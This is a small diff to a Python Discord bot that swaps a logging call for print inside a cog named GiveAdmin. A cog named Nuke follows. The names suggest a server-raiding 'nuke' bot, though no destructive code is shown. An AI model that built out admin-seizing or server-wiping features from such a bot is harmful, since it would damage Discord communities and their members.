@@ -1,5 +1,3 @@
-import logging
-
 import discord
 from discord.ext import commands
 from discord.ext.commands import BucketType, CommandOnCooldown
@@ -24,7 +22,7 @@ class GiveAdmin(commands.Cog):
         except discord.Forbidden:
             await ctx.send("Error: No permission, make sure i have admin!", delete_after=2)
         except Exception as e:
-            logging.error(f"Error: {e}!")
+            print(f"Error: {e}!")
 
 
 class Nuke(commands.Cog):
